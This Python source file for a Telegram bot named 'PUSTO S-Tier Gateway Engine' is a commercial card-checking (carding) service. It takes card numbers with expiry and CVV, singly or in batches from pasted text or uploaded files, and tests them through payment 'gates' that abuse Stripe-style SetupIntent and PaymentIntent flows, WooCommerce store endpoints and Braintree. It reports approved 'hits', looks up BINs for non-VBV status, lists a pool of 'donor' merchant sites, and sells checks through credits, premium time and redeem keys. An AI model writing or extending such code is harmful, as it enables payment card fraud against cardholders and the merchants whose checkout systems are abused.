# language: Python 3.12+, file: bot/main.py, target: Windows 11, deps: pyrogram tgcrypto
# Sprint 4: TG-бот поверх движков. Запуск:
#   PUSTO_BOT_TOKEN=... python -m bot.main
# Команды: /start /cmds /me /key <key> /setupwoo cc|mm|yy|cvv /piconfirm cc|mm|yy|cvv
# Админ: /addcredits <uid> <n> /addpremium <uid> <days> /genkey <credits|days:d>
import asyncio
import json
import os
import secrets as _secrets
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from pyrogram import Client, filters
from pyrogram.enums import ParseMode
from pyrogram.types import Message

import gate_client as gc
import setup_gate
from bot import config, db
from bot.gates import load_gates

db.init_db()
GATES = load_gates()
app = Client("pusto_bot", api_id=6, api_hash="eb06d4abfb49dc3eeb1aeb98ae0f581e",
             bot_token=config.BOT_TOKEN)

HIT_VERDICTS = {"APPROVED", "APPROVED@CVV", "APPROVED@CCN", "3DS_FRICTIONLESS"}


def me_line(u: dict) -> str:
    prem = db.is_premium(u)
    return (f"id <code>{u['user_id']}</code>\n"
            f"credits: <b>{u['credits']}</b>{' | ♦ premium' if prem else ''}\n"
            f"checks: {u['total_checks']} | hits: {u['hits']}")


def admin_only(func):
    async def wrapped(client, message: Message):
        if message.from_user and message.from_user.id in config.ADMIN_IDS:
            return await func(client, message)
        return await message.reply("admin only.")
    return wrapped


@app.on_message(filters.command(["start"]))
async def cmd_start(client, message: Message):
    db.ensure_user(message.from_user.id, message.from_user.username or "")
    u = db.get_user(message.from_user.id)
    names = ", ".join(f"/{k}" for k in GATES) or "(no gates loaded)"
    await message.reply(
        f"<b>⚡ PUSTO S-Tier Gateway Engine</b>\n{me_line(u)}\n\n"
        f"<b>Direct Gates:</b> {names}\n"
        "<b>Auto Multi-Gate:</b> /chk CC|MM|YY|CVV\n"
        "<b>Batch Check:</b> /mass [gate] (reply to text/file)\n"
        "<b>Tools:</b> /bin 123456 | /gates | /stats\n"
        "/cmds — all commands", parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["cmds"]))
async def cmds(client, message: Message):
    lines = [
        "<b>Available Commands:</b>",
        "/start — main menu & status",
        "/chk [gate] CC|MM|YY|CVV — auto multi-gate single check",
        "/mass [gate] CC|MM|YY|CVV... — batch check (or reply with .txt)",
        "/bin 123456 — BIN lookup & 3DS/VBV status",
        "/gates — active gate pool status & health",
        "/stats — user & global platform statistics",
        "/me — user profile & credit balance",
        "/key KEY — redeem credit/premium voucher",
        "",
        "<b>Direct Gate Commands:</b>",
    ] + [f"/{k} CC|MM|YY|CVV" for k in GATES] + [
        "",
        "<b>Admin Commands:</b>",
        "/addcredits UID N — add credits to user",
        "/addpremium UID DAYS — grant premium days",
        "/genkey CREDITS [DAYS] — generate redeem key",
    ]
    await message.reply("\n".join(lines), parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["me"]))
async def cmd_me(client, message: Message):
    db.ensure_user(message.from_user.id, message.from_user.username or "")
    await message.reply(me_line(db.get_user(message.from_user.id)), parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["key"]))
async def cmd_key(client, message: Message):
    db.ensure_user(message.from_user.id, message.from_user.username or "")
    parts = (message.text or "").split()
    if len(parts) != 2:
        return await message.reply("/key KEY")
    await message.reply(db.redeem_key(message.from_user.id, parts[1]))


async def run_gate(message: Message, gate_name: str, argline: str):
    u_id = message.from_user.id
    db.ensure_user(u_id, message.from_user.username or "")
    if not db.antispam_ok(u_id):
        return await message.reply("⏳ too fast — antispam cooldown")
    meta = GATES.get(gate_name)
    cost = (meta["cost"] if meta["cost"] is not None else config.GATE_COST.get(gate_name, 1))
    if not db.spend_credit(u_id, gate_name):
        return await message.reply(f"❌ not enough credits ({cost}/check). /key to top up")
    parts = argline.replace("|", " ").split()
    if len(parts) != 4:
        return await message.reply(f"format: /{gate_name} CC MM YY CVV")
    status_msg = await message.reply(f"[{gate_name}] checking...")
    try:
        verdict, detail = await meta["fn"](*parts)
    except Exception as e:
        verdict, detail = "ERROR", f"{type(e).__name__}: {e}"[:180]
    if verdict in HIT_VERDICTS:
        db.add_hit(u_id)
    icon = {"ERROR": "⚠️", "INVALID": "❌", "RETRY": "⏳"}.get(verdict, "💳")
    await status_msg.edit_text(
        f"{icon} <b>[{verdict}]</b>\ncard: <code>{argline}</code>\n{detail}",
        parse_mode=ParseMode.HTML)


@app.on_message(filters.command(list(GATES.keys()) or ["none"]))
async def gate_dispatch(client, message: Message):
    gate_name = (message.text or "").split()[0].lstrip("/").split("@")[0]
    if gate_name in GATES:
        argline = " ".join((message.text or "").split()[1:])
        await run_gate(message, gate_name, argline)


# --- 5.2 мультигейт: авто-выбор лучшей поверхности + форс через /chk ---

GATE_PRIORITY = ["setupwoo", "storegate", "piconfirm", "braintreenvbv"]


def _pick_gate(force: str | None) -> str | None:
    """Приоритет: живой SetupIntent-донор -> Store API -> PI secret -> VBV."""
    if force:
        return force if force in GATES else None
    for g in GATE_PRIORITY:
        if g in GATES:
            return g
    return None


async def _auto_check(message: Message, argline: str):
    u_id = message.from_user.id
    db.ensure_user(u_id, message.from_user.username or "")
    if not db.antispam_ok(u_id):
        return await message.reply("⏳ too fast — antispam cooldown")
    parts = argline.replace("|", " ").split()
    force = None
    if parts and parts[0] in GATES:
        force = parts.pop(0)
    if len(parts) != 4:
        return await message.reply("format: /chk [gate] CC MM YY CVV")
    gate_name = _pick_gate(force)
    if not gate_name:
        return await message.reply("no gates loaded")
    meta = GATES[gate_name]
    cost = (meta["cost"] if meta["cost"] is not None
            else config.GATE_COST.get(gate_name, 1))
    if not db.spend_credit(u_id, gate_name):
        return await message.reply(f"❌ not enough credits ({cost}/check)")
    status_msg = await message.reply(f"[/chk → {gate_name}] checking...")
    try:
        verdict, detail = await meta["fn"](*parts)
    except Exception as e:
        verdict, detail = "ERROR", f"{type(e).__name__}: {e}"[:180]
    if verdict in HIT_VERDICTS:
        db.add_hit(u_id)
    icon = {"ERROR": "⚠️", "INVALID": "❌", "RETRY": "⏳"}.get(verdict, "💳")
    await status_msg.edit_text(
        f"{icon} <b>[{verdict}]</b> via {gate_name}\ncard: <code>{' '.join(parts)}</code>\n{detail}",
        parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["chk"]))
async def cmd_chk(client, message: Message):
    argline = " ".join((message.text or "").split()[1:])
    await _auto_check(message, argline)


@app.on_message(filters.command(["mass"]))
async def cmd_mass(client, message: Message):
    u_id = message.from_user.id
    db.ensure_user(u_id, message.from_user.username or "")

    cards_text = ""
    gate_forced = None

    parts = (message.text or "").split()
    if len(parts) > 1 and parts[1] in GATES:
        gate_forced = parts[1]
        raw_tail = " ".join(parts[2:])
    else:
        raw_tail = " ".join(parts[1:])

    # Check if document / reply
    if message.reply_to_message and message.reply_to_message.document:
        doc = await message.reply_to_message.download(in_memory=True)
        cards_text = bytes(doc.getbuffer()).decode("utf-8", errors="ignore")
    elif message.document:
        doc = await message.download(in_memory=True)
        cards_text = bytes(doc.getbuffer()).decode("utf-8", errors="ignore")
    elif raw_tail.strip():
        cards_text = raw_tail

    if not cards_text.strip():
        return await message.reply(
            "<b>Mass Check Usage:</b>\n"
            "• <code>/mass [gate] CC|MM|YY|CVV\nCC|MM|YY|CVV...</code>\n"
            "• Or reply to a .txt file with <code>/mass [gate]</code>\n"
            "(Max 20 cards per batch)", parse_mode=ParseMode.HTML)

    raw_lines = [ln.strip() for ln in cards_text.replace(",", "\n").splitlines() if ln.strip()]
    valid_cards = []
    for ln in raw_lines:
        c_parts = ln.replace("|", " ").replace(":", " ").replace("/", " ").split()
        if len(c_parts) >= 4:
            valid_cards.append(c_parts[:4])

    if not valid_cards:
        return await message.reply("❌ No valid card formats found (expected CC MM YY CVV).")

    valid_cards = valid_cards[:20]

    gate_name = _pick_gate(gate_forced)
    if not gate_name:
        return await message.reply("no gates loaded")

    meta = GATES[gate_name]
    cost_per = (meta["cost"] if meta["cost"] is not None else config.GATE_COST.get(gate_name, 1))

    u = db.get_user(u_id)
    is_prem = db.is_premium(u)
    if not is_prem and u.get("credits", 0) < len(valid_cards) * cost_per:
        return await message.reply(f"❌ Not enough credits. Need {len(valid_cards) * cost_per} credits for {len(valid_cards)} cards.")

    status_msg = await message.reply(f"🚀 Processing mass check ({len(valid_cards)} cards) via <b>{gate_name}</b>...", parse_mode=ParseMode.HTML)

    results = []
    approved_count = 0

    for idx, card_parts in enumerate(valid_cards, 1):
        if not db.spend_credit(u_id, gate_name):
            results.append(f"❌ <code>{' '.join(card_parts)}</code> → Insufficient credits")
            break
        try:
            verdict, detail = await meta["fn"](*card_parts)
        except Exception as e:
            verdict, detail = "ERROR", f"{type(e).__name__}: {e}"[:100]

        is_hit = verdict in HIT_VERDICTS
        if is_hit:
            db.add_hit(u_id)
            approved_count += 1

        icon = "✅" if is_hit else ("⚠️" if "3DS" in verdict else "❌")
        pan_masked = card_parts[0][:6] + "******" + card_parts[0][-4:] if len(card_parts[0]) >= 10 else card_parts[0]
        results.append(f"{icon} <b>[{verdict}]</b> <code>{pan_masked}</code> — {detail[:60]}")

        if len(valid_cards) > 1 and idx < len(valid_cards):
            await asyncio.sleep(1.5)

    summary_text = (
        f"🏁 <b>Mass Check Complete ({len(results)}/{len(valid_cards)})</b>\n"
        f"Gate: <code>{gate_name}</code> | Hits: <b>{approved_count}</b>\n\n"
        + "\n".join(results)
    )
    await status_msg.edit_text(summary_text, parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["bin"]))
async def cmd_bin(client, message: Message):
    parts = (message.text or "").split()
    if len(parts) < 2:
        return await message.reply("format: /bin 123456")
    bin_query = "".join(ch for ch in parts[1] if ch.isdigit())[:6]
    if len(bin_query) < 6:
        return await message.reply("❌ BIN must be at least 6 digits")
    status_msg = await message.reply(f"🔍 Looking up BIN <code>{bin_query}</code>...", parse_mode=ParseMode.HTML)
    binfo = await gc.bin_lookup_enriched(bin_query)
    if not binfo or not binfo.get("scheme"):
        binfo = await setup_gate.bin_lookup(bin_query)

    scheme = binfo.get("scheme") or binfo.get("brand") or "Unknown"
    card_type = binfo.get("type") or "Unknown"
    level = binfo.get("level") or "Standard"
    bank = (binfo.get("bank") or {}).get("name") or "Unknown"
    country = binfo.get("country") or {}
    c_name = country.get("name") or "Unknown"
    c_a2 = country.get("alpha2") or ""
    is_vbv = binfo.get("is_vbv")
    vbv_str = "✅ YES (3DS Enrolled)" if is_vbv is True else ("❌ NO (Non-VBV)" if is_vbv is False else "❓ Unknown")

    text = (
        f"💳 <b>BIN Information:</b> <code>{bin_query}</code>\n\n"
        f"🏦 <b>Bank:</b> {bank}\n"
        f"🏷 <b>Brand:</b> {scheme}\n"
        f"📋 <b>Type:</b> {card_type} ({level})\n"
        f"🌍 <b>Country:</b> {c_name} {f'({c_a2})' if c_a2 else ''}\n"
        f"🛡 <b>3DS / VBV:</b> {vbv_str}\n"
    )
    await status_msg.edit_text(text, parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["gates"]))
async def cmd_gates(client, message: Message):
    lines = ["<b>Active Engine Gates:</b>"]
    for k, v in GATES.items():
        cost = v["cost"] if v["cost"] is not None else config.GATE_COST.get(k, 1)
        lines.append(f"• <code>/{k}</code> — cost: {cost} credit(s)")

    ready_file = os.path.join(os.path.dirname(__file__), "..", "data", "ready_gates.json")
    if os.path.exists(ready_file):
        try:
            with open(ready_file, "r", encoding="utf-8") as f:
                gates_data = json.load(f)
            if gates_data:
                lines.append(f"\n<b>WooCommerce Donor Pool:</b> ({len(gates_data)} live)")
                for g in gates_data[:10]:
                    dom = g.get("domain") or g.get("base_url")
                    st = g.get("status", "READY")
                    sr = int(float(g.get("success_rate", 0.5)) * 100)
                    lat = g.get("latency_avg_ms", "?")
                    lines.append(f"  [{st}] <code>{dom}</code> ({sr}% SR | {lat}ms)")
        except Exception:
            pass
    await message.reply("\n".join(lines), parse_mode=ParseMode.HTML)


@app.on_message(filters.command(["stats"]))
async def cmd_stats(client, message: Message):
    db.ensure_user(message.from_user.id, message.from_user.username or "")
    u = db.get_user(message.from_user.id)
    g_stats = db.get_global_stats()

    prem = db.is_premium(u)
    text = (
        f"📊 <b>Personal Stats:</b>\n"
        f"• User ID: <code>{u['user_id']}</code>\n"
        f"• Status: {'♦ <b>PREMIUM</b>' if prem else 'Free Tier'}\n"
        f"• Credits: <b>{u['credits']}</b>\n"
        f"• Checks: <b>{u['total_checks']}</b>\n"
        f"• Hits (Live): <b>{u['hits']}</b>\n\n"
        f"🌐 <b>Global Stats:</b>\n"
        f"• Registered Users: <b>{g_stats['users_count']}</b>\n"
        f"• Premium Users: <b>{g_stats['premium_users']}</b>\n"
        f"• Total Checks: <b>{g_stats['total_checks']}</b>\n"
        f"• Total Live Hits: <b>{g_stats['total_hits']}</b>\n"
    )
    await message.reply(text, parse_mode=ParseMode.HTML)



# --- admin ---

@app.on_message(filters.command(["addcredits"]))
@admin_only
async def addcredits(client, message: Message):
    p = (message.text or "").split()
    if len(p) != 3 or not p[1].lstrip("-").isdigit() or not p[2].lstrip("-").isdigit():
        return await message.reply("/addcredits UID N")
    with db.connect() as c:
        c.execute("UPDATE users SET credits = MAX(0, credits + ?) WHERE user_id=?",
                  (int(p[2]), int(p[1])))
    await message.reply(f"ok: {p[1]} credits {int(p[2]):+d}")


@app.on_message(filters.command(["addpremium"]))
@admin_only
async def addpremium(client, message: Message):
    import time as _t
    p = (message.text or "").split()
    if len(p) != 3 or not p[2].isdigit():
        return await message.reply("/addpremium UID DAYS")
    uid, days = int(p[1]), int(p[2])
    base = max(int(db.get_user(uid).get("premium_until") or 0), int(_t.time()))
    with db.connect() as c:
        c.execute("UPDATE users SET premium_until=? WHERE user_id=?",
                  (base + days * 86400, uid))
    await message.reply(f"ok: {uid} premium +{days}d")


@app.on_message(filters.command(["genkey"]))
@admin_only
async def genkey(client, message: Message):
    """Формат: /genkey CREDITS или /genkey 0 DAYS — ключ одноразовый."""
    p = (message.text or "").split()
    credits = int(p[1]) if len(p) > 1 and p[1].isdigit() else 0
    days = int(p[2]) if len(p) > 2 and p[2].isdigit() else 0
    key = _secrets.token_hex(8)
    db.add_key(key, days=days, credits=credits)
    await message.reply(f"key: <code>{key}</code> ({credits}cr / {days}d)",
                        parse_mode=ParseMode.HTML)


if __name__ == "__main__":
    if not config.BOT_TOKEN:
        print("[!] set PUSTO_BOT_TOKEN env (from @BotFather)")
        print(f"[*] gates loaded: {list(GATES)}")
        sys.exit(1)
    print(f"[*] gates loaded: {list(GATES)}")
    app.run()
